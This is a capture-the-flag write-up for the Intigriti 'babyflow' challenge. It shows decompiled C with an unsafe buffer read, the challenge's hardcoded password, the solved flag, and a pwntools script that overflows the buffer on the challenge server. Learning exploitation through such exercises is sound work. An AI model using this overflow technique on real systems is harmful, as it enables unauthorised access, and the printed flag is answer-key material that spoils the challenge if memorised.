# Description
Does this login application even work?!  

`nc babyflow.ctf.intigriti.io 1331`

# Flag
INTIGRITI{b4bypwn_9cdfb439c7876e703e307864c9167a15}

# Analysis
From the source code that is provided we can see it is a normal login application, the password is hardcoded into the source code as well which is "SuPeRsEcUrEPaSsWoRd123". However, the program is not entirely a normal login application because it runs a check to see if the value of "v5" is 0 or 1 in which case it will or will not print the flag.
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[44]; // [rsp+0h] [rbp-30h] BYREF
  int v5; // [rsp+2Ch] [rbp-4h]

  v5 = 0;
  printf("Enter password: ");
  fgets(s, 50, _bss_start);
  if ( !strncmp(s, "SuPeRsEcUrEPaSsWoRd123", 0x16uLL) )
  {
    puts("Correct Password!");
    if ( v5 )
      puts("INTIGRITI{the_flag_is_different_on_remote}");
    else
      puts("Are you sure you are admin? o.O");
    return 0;
  }
  else
  {
    puts("Incorrect Password!");
    return 0;
  }
}
```

![image](https://github.com/user-attachments/assets/7e508e7f-1296-4709-b391-a99e26852706)

If you attempt to login with just the password this is the result you will receive above.

From the source code we can deduce that the array for the input can only take in 44 characters but the fgets function is taking in 50. Hence this is our injection point and we can take advantage of this buffer overflow to overwrite the value of v5.
# Solution
So for the solution we need to pass the check for the correct password and overwrite the value of v5. To do this I used the script below:
```
from pwn import *

# Set the target binary and address to use the buffer overflow
# (Assuming you're running this locally or through a remote server)
p = remote('babyflow.ctf.intigriti.io', 1331)  # Replace with actual binary path if needed

# Craft the payload:
# Password + padding to fill buffer + overwrite v5 with 1
password = b"SuPeRsEcUrEPaSsWoRd123"
padding = b"A" * (44 - len(password))  # 'A' * 44 to fill the buffer, p32(1) to set v5 to 1
v5_overwrite = p32(1) 

payload = password + padding + v5_overwrite

# Wait to receive this line from server then only sending the payload
p.recvuntil("Enter password: ")

# Send the payload to the server
p.sendline(payload)

p.interactive()

# Capture and print the output to see the result
print(target.recvall().decode())

```

#L337upCTF2024
